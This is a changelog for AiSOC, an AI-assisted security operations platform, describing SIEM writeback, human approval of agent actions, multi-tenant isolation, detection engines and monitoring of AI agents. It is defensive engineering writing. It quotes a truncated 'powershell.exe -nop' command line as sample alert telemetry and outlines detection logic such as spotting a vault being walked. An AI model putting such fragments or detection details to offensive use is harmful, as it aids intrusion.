  Splunk notable became an alert, the agent triaged it, and the notable sat in
  the Splunk queue untouched — so an analyst re-read a finding AiSOC had
  already dismissed, and a finding AiSOC had confirmed waited its turn behind
  them. Nothing on `main` wrote a disposition back to any SIEM in any form.

  New capability `update_alert_disposition` with five vendor arms (Splunk ES,
  Elastic Security, Microsoft Sentinel, IBM QRadar, Microsoft Defender), two
  new clients (`sentinel_client.py`, `qradar_client.py`), migration
  `057_alert_source_links.sql`, and `POST /api/v1/alerts/{id}/source-writeback`.
  The agents triage worker posts to that route after the verdict is durable and
  fails soft — the verdict outranks its writeback, and an unreachable Splunk
  must not dead-letter an alert that was triaged correctly. Docs:
  [Integrations → SIEM writeback](apps/docs/docs/integrations/siem-writeback.md).

  **The disposition mapping is the safety argument, not the approval tier.** A
  confirmed true positive is *escalated and never closed*: it is the finding a
  human most needs to see, and closing it because the platform is confident is
  how an agent turns a real intrusion into a resolved ticket nobody read. An
  unknown verdict is *refused, never guessed* — which matters because
  `normalize_disposition` defaults an unrecognised string to `true_positive`,
  so a mapper that normalised first would convert "I do not recognise this"
  into a confident claim. Only benign and false-positive verdicts may close a
  finding, and `benign_true_positive` is classified as a correct detection of
  authorised activity rather than as a false positive, so it never inflates a
  rule's own FP rate.

  **Governance ships dry-run by default.** `AISOC_SIEM_WRITEBACK_ENABLED`
  defaults on and `AISOC_SIEM_WRITEBACK_EXECUTE` defaults **off**, so an
  operator opts in to writing into their own SIEM. Anything that is not an
  explicit yes — including a typo — is read as a dry run. `executed` is the
  single field that means a vendor was touched; it is carried on the API
  response, on the worker's return value, and as a no-default column on
  `alert_source_links`, so a dry run, a refusal and a credential-less
  simulation can never be read as a write that happened. Projecting a closing
  verdict onto a linked Jira / ServiceNow ticket needs a third flag
  (`AISOC_SIEM_WRITEBACK_CLOSE_CASE`, off) because the ITSM connectors project
  a status transition rather than a note, so the only truthful way to reach the
  ticket is to resolve the case for real.

- **The join key survives ingest.** `finding.uid` — the vendor's own id for a
  finding — reached the OCSF envelope and was then discarded, so by the time a
  row hit `alerts` the notable's rule UID, the Elastic signal id and the QRadar
  offense id were gone and no verdict could be aimed at anything. Fusion now
  carries it onto `alerts.external_id` and writes an `alert_source_links` row,
  but only for a vendor with a writeback arm: a link to a system AiSOC cannot
  write to would read as a two-way integration that is not one.

- **A SOC operations dashboard at `/dashboards/operations`.** `/dashboard`
  answers what is happening in the estate; this answers whether the machine
  that reports it is working. The distinction matters because every failure
  mode of a detection pipeline makes it *quieter* — a connector stops polling,
  a schema changes and events bounce, a token expires — and an alert-centric
  view reports all three as good news.

  Six panels, each backed by one endpoint and owning its own fetch, loading,
  empty and error state: connector fleet staleness (`/health/fleet`), rejected
  events by reason (`/health/dead-letters`), alert severity and disposition
  (`/alerts/stats`), detection coverage counting only *enabled* rules
  (`/detection/coverage`), agent runs/tokens/spend (`/costs/dashboard`), and
  response actions paused for approval (`/approvals`). The first three had no
  web client at all.

  Fleet staleness is reported against each connector's own cadence — "3.2
  intervals behind" rather than an absolute age, because a daily connector and
  a five-minute connector are not late at the same wall-clock time. One dead
  endpoint blanks one panel and names the failure; it does not take the page
  down and does not substitute plausible figures.

- **Federated SIEM search has a console surface.** `/api/v1/federated/backends`
  and `/api/v1/federated/search` have fanned one query out to Splunk, Microsoft
  Sentinel, Elastic and QRadar — in parallel, against each tenant's own
  vault-encrypted credentials — for some time. `apps/web` had no client for
  either, so the capability was reachable only from the SDK. `/federated-search`
  now exposes it: pick which connected SIEMs to query, describe the search once
  in free text plus optional `field operator value` filters, and read the merged
  rows.

  The design constraint the page is built around is the endpoint's per-source
  isolation. It deliberately never fails the whole call because one backend is
  slow, 401s or 5xxs; it returns a verdict per backend instead. A UI that
  renders only the merged rows discards that, and the analyst cannot tell
  "Sentinel has nothing" from "Sentinel did not answer" — opposite conclusions
  mid-incident. So the per-backend strip renders above the rows, always, with
  each backend's own row count, latency and error message. A backend that
  failed shows no row count, because "0 rows" beside a timeout reads as
  "nothing matched". An empty result set is labelled "No matching events" when
  a backend answered and matched nothing, and "No backend returned results"
  when every backend failed.

  Recognised entities in a row deep-link to `/graph?entity=<type>:<value>`.
  Recognition is a fixed per-vendor field-name list rather than a heuristic:
  `src_ip`, `source.ip` and `SourceIP` all resolve to the same IP pivot, while
  `zip`, `recipient` and `description` resolve to none.

- **`/graph` honours `?entity=` and selects the node it names.** Three callers
  already built that URL — the Investigation Rail's entity chips, `HuntView`'s
  "Pivot to graph" button, and now federated search — and nothing read it, so
  every pivot navigated to the graph and dropped the entity, leaving the
  analyst to find the node by eye. Both the typed form (`host:WIN-DC01`) and
  the bare form `HuntView` emits are accepted, matching on node id then label.
- **A real operator organisation above tenants, so the MSSP console can be
  backed by data instead of gated behind demo mode.** `/mssp/overview`,
  `/mssp/tenants` and `/mssp/incidents` returned five hardcoded companies —
  "Acme Corp, health 92.4, 12 open alerts", "Wayne Enterprises", invented
  incidents with invented assignees — because the cross-tenant aggregation
  query behind them was never written. Gating the sample behind demo mode
  removed the lie but left the feature unbuilt: outside demo mode the
  console showed zeros forever. Making it real was a schema change, not an
  ungating.

  Migration `058` adds `organizations`, `organization_members`,
  `organization_tenants` and `organization_member_tenants`, and backfills
  from `tenants.parent_tenant_id`, which keeps working. Three constraints
  hold the boundary in the database rather than in whichever code path
  writes a row: `organization_tenants` is unique on `tenant_id` so two
  providers cannot claim one customer; `organization_member_tenants` has
  composite foreign keys onto both the membership and the portfolio, so a
  grant cannot name an unmanaged tenant and releasing a tenant revokes every
  grant over it; and `organizations.home_tenant_id` cascades, so erasing a
  provider's own tenant removes the organisation while leaving its customers
  standing as unclaimed tenants.

  Roles carry two separate axes. `owner`/`admin` reach the whole portfolio;
  `operator`/`viewer` reach only tenants granted to them, and **nothing**
  when they have no grants — "no scope" degrading into "all scopes" is the
  shape every cross-tenant leak in this codebase has had.

  Every cross-tenant read resolves its tenant list through
  `resolve_portfolio_scope` and nowhere else, then passes it to
  `require_scope`, which raises rather than letting an aggregate run
  unfiltered; the list is bound as a query parameter. A `?tenant_id=` filter
  is intersected with the portfolio, so naming an outside tenant narrows to
  nothing instead of reaching out. An AST gate fails the build if a new
  cross-tenant function is added that never calls `require_scope`, and
  `test_mssp_portfolio_isolation.py` replays two organisations plus an
  unmanaged tenant against live Postgres in `integration.yml`.

  The sample rows are deleted rather than gated. `health_score` is gone
  because it was an undefined composite; `mttr_minutes` is measured from
  cases a tenant actually closed and is null when it closed none; seeded
  rows are counted separately as `synthetic_alerts` and excluded from the
  headline figures.

- **Per-tenant limit headroom, so a cap cannot throttle a customer
  silently.** A tenant that hits a ceiling raises no error anyone sees —
  alerts keep arriving and stop being triaged, which reads to an evaluator
  as "the AI doesn't work". `app/services/entitlements.py` measures
  `connectors`, `seats`, `alerts_per_day` and `triages_per_month` from real
  rows, reports `ok` / `warning` / `exhausted` per tenant across a
  portfolio, and logs exhaustion at `warning`. AiSOC ships uncapped: a key
  with no configured ceiling reports `unlimited` rather than a default
  nobody set. Ceilings come from `tenants.limits` (per tenant, wins in
  either direction) or the new `AISOC_DEFAULT_TENANT_LIMITS` setting —
  declared as a real field, because an undeclared setting is dropped by
  `extra="ignore"` and the operator who exports it gets no explanation.


- **The Splunk warehouse driver executes.** It previously raised
  `HuntNotConfigured("provider scaffolded but live SPL execution not yet
  shipped")` on every call, so the SPL every hunt was translated into was
  discarded. `app/services/spl_runner.py` carries the same three guards as the
  ES|QL runner — per-tenant SSRF allow-list, air-gap policy, row cap — and
  prefixes the translator's bare `index=…` expression with `search`, without
  which Splunk's REST API answers 400 on every hunt.

### Removed

- **The identity timeline's phantom second source.** It queried a table named
  `aisoc_events` that no migration creates, nothing writes to, and that appears
  nowhere else in the repository — with its failure swallowed at `DEBUG`. It
  read as a second source of evidence while returning nothing on every
  deployment. The remaining source now reports itself on the response
  (`sources_unavailable`) when it cannot be read, so an empty timeline caused
  by a broken query is distinguishable from one caused by no matches.

- **The Chronicle warehouse scaffold.** It read `hunt.translated_query["udm"]`,
  nothing in the repository emits UDM, and it gated on two settings that were
  never fields — so it could not be selected and could not run, while
  `available_providers()` reported it as a supported warehouse. Adding a real
  one is a `register_provider` call plus a UDM translator.

## [9.0.0] — 2026-09-23

**Ten waves, and one finding under nearly all of them: the mechanism existed,
was tested, and nothing called it.** v8.0 named that shape and found it a
dozen times. This release went looking for it deliberately, across the whole
tree, and found it again in the approval loop, the marketplace, the mobile
console, the detection engine and the benchmark scoreboard. A passing unit
test on an uncalled function is indistinguishable from a working feature
until somebody traces the call graph, and the only defence is to trace it.

The one worth stating first, because it inverts what the feature appeared to
do: **approving an action executed nothing.** `decide()` flipped a row,
notified the realtime service and returned 200 without ever touching
`services/actions`. Every tap of Approve in the responder app recorded a
decision and ran nothing — while telling the operator the opposite. That is
the most dangerous shape a security control can have, because what it appears
to say is "the host is contained". And the other end was missing too: nothing
in the repository ever created an approval, so the queue had no producer
either and was structurally empty on every deployment.

### Added

- **Approvals reach a human and then reach the estate** ([#731](https://github.com/beenuar/AiSOC/pull/731),
  [#735](https://github.com/beenuar/AiSOC/pull/735)). The triage worker raises
  one approval per proposed action that declares `requires_approval`, keyed
  deterministically so a Kafka replay re-raises the same approval rather than
  a second copy an operator cannot tell apart. `decide` carries the decision
  through to `services/actions` and records on the row whether it executed, in
  four distinct states, so "was this actually done" is answerable from the row
  rather than by correlating two services' logs. A refusal returns 502 saying
  the decision was stored and the action was not run.
- **The confidence × impact approval matrix now runs.** `approval_matrix.evaluate`
  was written, documented, unit-tested and listed in the claim-to-gate matrix
  as GATED, with **zero production callers** — `POST /actions` gated on blast
  radius alone, a property of the verb, so the same answer came back for a
  40%-confidence guess and a corroborated finding. Both gates run and the
  stricter wins, which is the composition rule the matrix already stated, so
  nothing can auto-execute that did not before. Ten action types tighten, and
  `/actions` becomes tier-aware for the first time.
- **A browser-facing proxy for the live-action registry.** Every route sat
  behind a service token, so nothing could answer "what can AiSOC do to my
  estate". Discovery and dry-run only: a live containment goes through the
  approval path so an approver is bound to it.
- **`apps/mobile`, a native responder app** ([#733](https://github.com/beenuar/AiSOC/pull/733)).
  The roadmap said the mobile console was "not started", which was true about
  React Native and misleading about the product — the responder console
  already existed as a PWA with a service worker, an offline approval queue
  and Web Push. The native app is a distribution channel, and it exists for
  one reason: iOS Web Push requires an installed PWA and has been unreliable
  even then. Unit tests and type-check run in CI; **no device build,
  simulator run or store submission has been performed**, and a CI gate fails
  if the README stops saying so.
- **`@aisoc/sdk` gained the namespaces a responder client needs** — approvals,
  push, on-call, live actions. All were in `docs/openapi.yaml` the whole time,
  which is why the gap went unnoticed: the generated types were complete and
  the hand-written surface was three releases behind.
- **Marketplace publisher identity, paid listings and entitlements**
  ([#734](https://github.com/beenuar/AiSOC/pull/734)). Migration `056`. There
  is no payment processor and no stub of one — wiring payments is an account
  action. What exists is the enforcement point, which is the part that would
  otherwise be written last and least carefully.
- **An egress default-deny NetworkPolicy** ([#736](https://github.com/beenuar/AiSOC/pull/736)),
  gated by `helm.yml`. Off by default, because a cluster whose CNI does not
  enforce NetworkPolicy ignores it silently and a control that is silently
  ignored reads as protection while providing none.
- **Distinct counting in the windowed detection engine**
  ([#737](https://github.com/beenuar/AiSOC/pull/737)). "Fifty reads by one
  principal" is a script retrying; "fifty *different* secrets read by one
  principal" is a vault being walked. Counting events cannot tell those apart,
  and 21 of the 74 rules awaiting a windowed evaluator name a `distinct_*`
  field.
- **`docs/audit/DEFERRED_SUBPHASES.md`** ([#739](https://github.com/beenuar/AiSOC/pull/739)).
  Six lettered sub-phases were "tracked in `docs/audit/PROGRESS.md`", which is
  gitignored and was never committed — so six named commitments had no scope
  anywhere a contributor could read.
- **New gates:** `helm.yml` (lint, render, kubeconform, server dry-run against
  a real kind cluster), `mobile.yml`, `check_go_module_paths.py`,
  `check_published_packages.py`, and scoreboard staleness.

### Fixed

- **UEBA never scored a single message** ([#730](https://github.com/beenuar/AiSOC/pull/730)).
  It consumed `security.events`, which nothing in the platform writes — ingest
  writes `aisoc.raw_events`. So `ueba.anomalies` never carried a message and
  fusion's UEBA confidence boost, on by default and fully built, could only
  ever be inert. `feature_extraction.py` recovers the entity and features from
  the OCSF envelope.
- **The ingest inbox could not have worked on any deployment.** Routes mount
  only with `DATABASE_DSN`, which no compose file set, and the templates were
  never copied into the runtime image, so even a correctly-configured
  deployment answered 503 for every template. Templates are `go:embed`-ed now:
  a directory cannot be missing from an image.
- **CrowdStrike alerts were anonymous.** The connector never read
  `behaviors[].user_name`, and the canonical field map knew only `actor` while
  11 of the 68 canonical-envelope connectors spell it `username` or `user`.
  Since the correlation key is `{tenant}:{entity}:{tactic}`, they all
  correlated as `unknown`. The alias list is a slice, not more map entries,
  because Go randomises map iteration and three entries pointing at one
  destination would resolve differently per process.
- **An approved action was not the action approved.** `approve_action` rebuilt
  `ActionRequest` without `parameters` or `principal`, so an action gated
  *because of what it targets* ran against defaults and reported COMPLETED —
  and the submit path never stored parameters at all, so no rebuild could have
  recovered them.
- **Pending actions lived in a module-global dict.** A restart lost every
  action awaiting approval and a second replica could not see the first one's,
  so an analyst taps Approve on a Slack card and gets "Action not found" for
  an incident that is still live. Migration `055`.
- **Neither ChatOps bot could send an unsolicited message.** Replies go through
  Bolt's `respond()`, which writes to a `response_url` that only exists inside
  an inbound interaction, so the bot could answer a question and not ask one —
  while `rich_approval_card_blocks` sat fully written with no production
  caller and the Approve/Deny handlers sat wired and waiting.
- **A plugin could never be rejected for a bad signature.**
  `_get_registered_pub_key` returned `None` unconditionally, so `publish_plugin`
  skipped verification entirely. The signing path existed end to end, had a
  CLI command, and was incapable of saying no.
- **No registry allow-list and no digest pinning**, both of which the notes
  claimed existed. There was a deny list of three metadata hostnames, and
  nothing resolved a tag to a digest — so `:latest` stayed mutable and "what
  is this deployment running" had no answer after the fact. The signature gate
  does not close that: it verifies whatever arrived.
- **`aisoc plugin publish` POSTed to a route no router has ever served.**
  Broken as shipped.
- **The public scoreboard was frozen for ten weeks and every check passed**
  ([#738](https://github.com/beenuar/AiSOC/pull/738)). "Freshness" meant the
  accuracy value was current and nothing read the row's date; the newest row
  was taken by file position rather than by date; `--refresh` rewrote only the
  accuracy, so a refreshed row described today's code and claimed to have been
  measured in July. And there was no writer at all — `live-agent-eval.yml` had
  `contents: read`.
- **Neither published Go SDK was installable.** Both declared
  `github.com/beenuar/aisoc/<name>` — wrong case against a case-sensitive VCS
  path, missing the `packages/` prefix. Every in-repo consumer used a `replace`
  directive, which is the shape that hides this: the tree builds perfectly and
  the artifact does not exist.
- **The Helm chart did not render.** `helm template` fails outright until
  dependencies are fetched, and no documentation said to fetch them — nor to
  `helm repo add bitnami` first, which a clean machine also needs.
- **OpenSearch was recorded as dead code and is not.** The check had been made
  against `services/api`, which holds no OpenSearch client, and never against
  `services/threatintel`, which indexes into it in its lifespan with no flag
  and no `try`. Two real defects were hiding under the wrong verdict: compose
  set an env var that service discards, so the connection worked by
  coincidence, and it declared no dependency on OpenSearch so it raced it at
  boot.
- **One connectivity check at boot is a coin toss.** The graph writer verified
  Neo4j once and a failure disabled it for the process lifetime; compose
  cannot express "depend on neo4j only in the `full` profile", so ingest lost
  a race it had no way to wait for. The integration gate caught it
  intermittently — the same branch passed at 21:06 and failed at 21:19.
- Two stale comments that described working code as broken: the reachability
  gate's claim that the windowed engine "has three hardcoded rules and no
  loader", and the windowed exporter's claim to mirror the stateless one
  "exactly: specs are the source of truth".

### Changed

- **Packaging stops moving the number.** It slipped v8.0 → v8.1 → v8.2 for the
  same reason each time. The README now states a fact rather than a date —
  the pipeline builds and packs all eight packages on every tag, and the
  upload is blocked on registry credentials, which is an account action.
  `check_published_packages.py` reads actual registry state so that claim
  cannot go stale in either direction once credentials exist.
- Vulnerability-match events are opt-in: every stock deployment was
  downloading the CISA KEV catalogue at boot to publish into a topic with no
  reader.
- `aisoc.alerts.raw` is reclassified from dead to external entrypoint. No
  in-repo producer is what an entrypoint *is*.

### Known

- **Eight of the nine `PARTIAL` claim-to-gate rows remain**, each still naming
  its own gap. The air-gap row narrowed rather than flipping: the Helm half is
  built and gated, platform-wide egress-blocked CI is not. Relabelling a row
  for the half that is done is what that file exists to prevent.
- Whether migrations 050–056 apply to an *existing* Postgres volume is still
  untraced. Compose mounts them as `docker-entrypoint-initdb.d`, which runs
  only on a fresh volume.
- 133 detection rules remain unreachable. Authoring a `wd-*` rule does not make
  a `det-*` rule reachable, so `MAX_UNREACHABLE` is unchanged on purpose.
- The OCI install route is held back. Adding it made CodeQL flag eight
  `py/path-injection` sites across the plugin-ingest graph; trading "a hardened
  path with no caller" for "a reachable path with eight unresolved high
  findings" is the worse position.

## [8.1.1] — 2026-09-23

**The v8.1.0 notes described a platform its own quick start never started.**
This release contains no new capability. It exists because an adoption audit
of the repository — installability, architecture comprehension, data
provenance, pipeline connectivity — found that the single most-followed path
into AiSOC did not run AiSOC, and that finding accounts for most of the
recurring feedback on its own.

`./install.sh` handed off to a nine-service compose file with **no ingest
service, no fusion service, and `AISOC_DISABLE_KAFKA: true`**. Everything
visible in the resulting console came from `seed_demo.py` writing fifteen
fabricated incidents straight into Postgres. A reader followed the README, saw
a populated console, and concluded the platform worked — having never run the
platform. The installer printed *"AiSOC is up and running"* because the
compose command exited 0.

The good news the audit also produced: **the core pipeline does work.** It had
simply never been demonstrated. `make smoke` now pushes one real event through
ingest, Kafka, fusion and detection and reads the alert back from the API,
reaching past nothing, and CI fails if any stage does.

### Fixed

- **The documented quick start never ran the product** ([#726](https://github.com/beenuar/AiSOC/pull/726)).
  `install.sh` now runs `make up` — the same CORE stack the README documents
  and CI tests — and then runs the golden pipeline, so the installer's success
  banner reports a verified event traversal rather than a process exit code.
  `infra/compose/docker-compose.demo.yml` is kept for screenshots and UI work
  and now says at the top of the file that it cannot answer whether AiSOC
  works.
- **`services/ingest` answered `/health` unconditionally** ([#727](https://github.com/beenuar/AiSOC/pull/727)),
  so *"ingest is healthy"* and *"every event is being dropped"* could both be
  true at once — precisely the state a broker outage produces. `/readyz` now
  dials Kafka rather than reading a cached connection flag, because kafka-go
  reconnects lazily and a cached flag is stale in exactly the situation this
  is meant to catch. Verified live: 200 with Kafka up, 503 with a reason and a
  log hint with Kafka stopped.
- **Three of the eight publishable packages could not be built** ([#725](https://github.com/beenuar/AiSOC/pull/725)).
  The release pipeline builds and packs every package on each tag precisely so
  it cannot rot while the upload is credential-gated — and on the v8.1.0 tag
  it earned that design back. `aisoc` and `@aisoc/mcp` failed with
  `Could not resolve "@aisoc/report-card"`: that workspace dependency's `main`
  points at a build artifact and `pnpm --filter <pkg> build` never builds
  dependencies, so the `...` suffix was missing. `aisoc-cli` could not produce
  a wheel at all — `pyproject.toml` declared `packages = ["src/aisoc_cli"]`
  *and* a `force-include` mapping the same templates directory to the same
  wheel path, so hatchling refused on the duplicate. Neither was visible
  anywhere but a tag. `test_packaging.py` now builds the wheel and looks
  inside it, because a test that read the config would have declared both
  fine.
- **Alerts were labelled `"crowdstrike crowdstrike"`** — vendor and product
  joined without deduplication, in two copies of the same helper, so fixing
  one left the other. There is one shared implementation now
  (`fusion/app/services/provenance.py::product_label`). In the same pass, an
  alert's `description` was `str(raw_data)`, so the console showed
  `{"command_line": "powershell.exe -nop ...` where a sentence belongs,
  discarding the vendor's own description.
- **Fusion defaulted its enrichment URL to `localhost:8082` — itself** — and
  swallowed the resulting failure at `DEBUG`; and fusion declared no
  `depends_on` for Postgres, so it raced the database on cold boot.
- **Five surfaces rendered fabricated data outside demo mode**: the MSSP
  overview and its managed-tenant and cross-tenant-incident lists, the
  Copilot's reply on API error, the air-gap status endpoint reporting
  unchecked conditions as satisfied, a hard-coded analyst identity in
  Settings, and the investigation timeline. All are gated behind demo mode and
  return honest empties otherwise. `seed_demo.py` refuses to run outside
  development unless `AISOC_ALLOW_SEED=1`.

### Added

- **`tests/e2e/golden_pipeline/`** — one deterministic end-to-end test that
  pushes raw telemetry into ingest and asserts each boundary independently, so
  a break names the stage rather than the suite. Wired into CI as
  `golden-pipeline.yml`, which also verifies the gate fails when the pipeline
  is broken.
- **`scripts/doctor.sh` / `make doctor`** — diagnoses Docker, Compose, disk,
  ports, configuration, Postgres, Redis, Kafka and every service, and prints
  the command to run next. It checks disk before Kafka and probes the broker
  directly, because the Docker VM filling up produced a Kafka that reported
  `healthy` while refusing every request.
- **`/livez` and `/readyz` on `services/ingest`**, matching `services/api` and
  `services/fusion`.
- **`scripts/project_stats.py --check`** — derives the connector count,
  executable detection count, compose service count and claim-to-gate totals
  from the tree and fails CI when the README disagrees.
- **`docs/audit/REPOSITORY_REALITY.md`** — every major component classified
  WORKING / PARTIAL / BROKEN / DEMO-ONLY / EXPERIMENTAL / DEAD CODE by tracing
  the implementation, not the filename. It records that OpenSearch is started
  by the `full` profile and read by nothing, rather than drawing it into a
  diagram as though it were part of the design.
- **`docs/architecture/README.md`** — rewritten around *what happens when
  AiSOC receives one security event*, with five diagrams whose every box links
  to the directory that implements it.
- **`docs/testing/CLEAN_INSTALL.md`** — the clean-machine walkthrough, from a
  real run.
- Migration `054_alert_provenance.sql` adds `is_synthetic`,
  `synthetic_source` and `synthetic_scenario` to `alerts`.

### Changed

- **CORE is the default deployment profile**: ten services, roughly 6 GB, and
  the smallest deployment that takes a real event and produces a real alert —
  not a cut-down toy. ClickHouse, Neo4j, Qdrant, OpenSearch, enrichment and
  connectors moved to `full`. Both heavy dependencies were already
  environment-gated, so nothing was weakened to do this. `make up-full` sets
  `AISOC_LAKE_WRITER_ENABLED` and `AISOC_GRAPH_ENABLED`, which the profile
  needs and did not previously set.
- **README rewritten for adoption** rather than release history: what AiSOC
  does, quick start, how to tell demo data from real data, connecting real
  sources, the data flow, project maturity per capability, and what AiSOC is
  not.
- **One command set.** `make install / up / up-full / down / restart / status
  / doctor / smoke / demo / logs / test / test-unit / test-integration /
  test-e2e / stats / clean`, consolidating the previous scattered scripts.
- The integration workflow boots the `full` profile with the lake writer and
  graph enabled, so it exercises the architecture it claims to.

## [8.1.0] — 2026-09-23

**Wave-2 features, and the gaps behind them.** Every item in the wave-2
backlog ([#362](https://github.com/beenuar/AiSOC/issues/362)) was audited
against the tree before any code was written, and the backlog turned out to be
wrong in both directions: two items were already built, and four had the
capability present with the path that feeds it broken. That is the same shape
v8.0 found a dozen times — the mechanism exists, is unit-tested, and has no
caller on the path that needs it — so auditing first is now the opening step
of a wave rather than an optional one.

Three of those gaps had security consequences, and one is worth stating
plainly because it inverts what the feature appeared to do: **a Slack or Teams
approval authorized nobody.** The bots verified who clicked, recorded them in
an audit event, and called the actions service with no approver, so the
permission-tier check and separation of duties were both skipped. An approval
path that does not authorize is worse than none, because it reads as a
control.

:::warning Breaking change for ChatOps approvals
`AISOC_ACTIONS_REQUIRE_APPROVER` defaults to `true`. If you use Slack or Teams
approvals you **must** populate `AISOC_CHATOPS_APPROVERS` or approvals will be
refused with a 403. Setup: `apps/docs/docs/operations/action-approvals.md`.
:::

Also in this release: the Codespaces quickstart can start Docker for the first
time, service images are published for arm64 so Apple Silicon can run
`pnpm aisoc:demo` at all, and packaging moves to v8.2 — the blocker is
registry credentials rather than code, and a release cannot schedule an
account action by writing a version number.

Claim-to-gate matrix: **108 rows — 99 GATED, 9 PARTIAL, 0 NO GATE**.

### Added

- **Securing the customer's AI estate.** AiSOC could already ingest an
  organisation's OpenAI and Anthropic *audit logs* — who minted an API key, who
  was granted owner. That is control-plane governance and says nothing about
  what the agents did once running. Of 23 capabilities leading AI-SOC products
  compete on, 22 already existed in this tree; this was the gap, and the five
  MCP detections already in the repo were sitting in `_quarantine/`,
  non-executable.
  - Two webhook templates (`ai-runtime`, `ai-finding`) and matching OCSF
    profiles, so the push and pull paths produce the same shape. The split
    between them is the design: routine agent activity is `6003` API Activity,
    category 6, which the promoter leaves in the lake to be hunted, while a
    guardrail finding is `2001` Security Finding, category 2, always promoted.
    All-2001 would flood the queue with an agent's normal operation; all-6003
    would leave a detected prompt injection silent in the lake. Both
    directions are tested.
  - `packages/aisoc-ai-sdk`, a dependency-free span emitter (enforced by CI,
    because it is imported into a customer's agent process). Prompt and
    response content is hashed by default and never transmitted unless the
    caller opts in — but *which secret shapes* were present is reported, so
    "this prompt contained an AWS key" is detectable while the key never
    leaves the process. Tool argument names are sent; values are not.
  - `ai_gateway` connector for LiteLLM / Portkey / Helicone / in-house
    proxies, covering every app behind a gateway — which matters because the
    apps most in need of visibility are the ones nobody will retrofit an SDK
    into. New `ai` connector category. 83 → 84 connectors.
  - Eight executable detections, authored as Python specs rather than YAML,
    since the YAML under `detections/` is a generated projection the engine
    never reads.
  - AiSOC's own MCP server is the first monitored AI asset. Its README claimed
    "every tool call lands in the AiSOC audit log with the calling user and the
    tool name"; it emitted nothing, and the API's audit middleware only records
    mutating methods with a valid JWT, so the ten read tools produced no audit
    row at all. It now emits to the same template a customer agent would use.
- **The agent's abstention rate and groundedness are published.** v8.0 wired
  groundedness scoring into the triage path and then discarded the score — it
  survived only inside a findings string. Migration 051 persists it, and
  `/metrics/funnel` exposes `abstention_rate`, `ungrounded_demotions`,
  `mean_groundedness` and `scored_verdicts`. A system that never abstains is
  not calibrated, it is guessing with confidence; publishing the rate inverts
  the usual incentive to report only an automation percentage.
- **The windowed detection engine has a loader.** It shipped with three
  hardcoded rules and its own docstring deferred the rest. That absence is most
  of why the quarantine has stayed at ~2,000 rules: a large share of
  quarantined Splunk imports are `| stats count ... by` aggregations, which
  cannot be expressed in the stateless matcher at all and had nowhere to go.
  Five rules to start, including the AI agent tool-denial counterpart to the
  low-severity stateless building block.
- **UEBA baselines non-human principals.** `service_account`, `ai_agent` and
  `mcp_server` were excluded by a regex on one HTTP route, while the schema
  column, the statistics and the Kafka path all accepted anything. These are
  the entities most in need of baselining: they run continuously with standing
  credentials. Doing this before v8.0's degenerate-variance fix would have been
  misleading, since a constant stream collapses the standard deviation and every
  such principal would have read as permanently normal.
- **Four capability pillars, on a credibility floor
  ([#696](https://github.com/beenuar/AiSOC/pull/696),
  [#697](https://github.com/beenuar/AiSOC/pull/697),
  [#707](https://github.com/beenuar/AiSOC/pull/707)).** The floor came first,
  because a published claim that is false costs more than a missing feature.
  - **Context graph.** Neo4j schema v1.1 adds identity, asset, cloud, business
    and threat depth — Employee joined to Identity, Vulnerability, Application
    criticality and data classification, CloudAccount and Secret, and the
    IOC → Malware → Campaign → ThreatActor → Technique chain. One
    tenant-scoped traversal resolves an alert into all five behind
    `GET /api/v1/graph/incident-context/{alert_id}`, feeding the agent's
    context bundle, with `POST /graph/context/import` for directory and CMDB
    data. Neo4j had no migration mechanism at all, so any schema change
    landed only on fresh installs; real runners now exist for all three
    non-Postgres stores (`services/api/app/db/{graph,lake,vector}_migrations.py`)
    and the gate checks the half that matters — that each is *called* from a
    startup path. Qdrant's vector dimension is immutable, so an
    embedding-model change is a re-embed, surfaced by `pending_rebuilds()`
    rather than silently mixing incompatible vectors.
  - **Recursive investigation.** `run_with_tools` shipped working, guarded and
    instrumented, with zero production callers. It now drives
    `services/agents/app/investigator/deep_investigation.py` over ten
    strategies, with seven typed lake-backed pivots in
    `services/api/app/services/investigation_tools.py` behind
    `POST /investigate/query` — the model picks a tool and passes typed
    arguments, it never writes SQL. `scripts/check_investigation_depth.py`
    asserts the loop still has a caller, because a narrative reads equally
    plausible whether the agent pivoted five times or once.
  - **Action contract.** Risk, reversibility, verification and approval are
    declared per *capability* rather than per vendor, since the contract
    belongs to the verb. `approval_matrix.py` implements confidence × impact
    and `scripts/check_action_contract.py` enforces it.
  - **SOC-agent benchmark.** `packages/aisoc-benchmark` ships an adapter
    protocol plus an HTTP adapter, so a third party's agent can be graded
    against the same corpus, with hallucination rate and real-vs-synthetic
    provenance labels on every row.
- **A model matrix, so an accuracy number names its backend
  ([#715](https://github.com/beenuar/AiSOC/pull/715)).** The weekly eval runs
  one model, so its numbers describe the agent *on whatever the pins resolved
  to* and cannot separate a property of the agent from a property of the
  backend. `scripts/run_model_matrix.py` grades the same corpus across several
  models, one variable at a time. It is deliberately a thin wrapper that sets
  the pins and re-invokes `run_evals.py` rather than a second evaluator — two
  definitions of accuracy drift apart, which is the defect the alert-reduction
  suite already demonstrated — and a test asserts it defines no scoring of its
  own. With no funded key every row reads **not measured**, never `0.000`: a
  zero is a measurement, and "we did not run this" is not.
- **Dead letters can be read back
  ([#713](https://github.com/beenuar/AiSOC/pull/713)).** Three DLQ
  implementations existed — a log line, a Kafka topic with no consumer, and one
  that forgets on restart — and the worker defaulted to the first. An invisible
  drop is indistinguishable from an event that never arrived, and only one of
  those is an incident. `PostgresDLQ` plus migration `053_dead_letters.sql`
  persists them and `GET /api/v1/health/dead-letters` reads them back with a
  breakdown by reason. `/health/fleet` reports connector staleness alongside.
- **SLO alerts are generated from the objectives
  ([#713](https://github.com/beenuar/AiSOC/pull/713)).** `slos.yaml` declared
  targets for 17 services while the alert rules used thresholds corresponding
  to no objective in the file. `scripts/generate_slo_alerts.py` derives
  burn-rate alerts from it, covering the five services that actually expose
  `/metrics` and naming the twelve that do not, so no alert can be permanently
  dead.
- **The last two fidelity corpora are obtainable
  ([#717](https://github.com/beenuar/AiSOC/pull/717)).** Four datasets have
  loaders; only two shipped a downloader. `ait_lds_loader.py` and
  `mitre_engenuity_loader.py` could parse their full corpora from the day they
  landed with no way to fetch either, so their only numbers came from a
  ten-line micro fixture — which proves the loader parses and says nothing
  about the classifier at scale. The asymmetry was invisible because each half
  looked complete alone and nothing compared the two sets;
  `scripts/check_fidelity_datasets.py` does, and also enforces licence
  acceptance and citation across all four. New `*_full` floors are marked
  `measured: false`, lead with UNMEASURED, and are set at the micro-fixture
  level rather than guessed higher, because a floor invented above an
  unmeasured result is a gate that gets lowered rather than investigated.
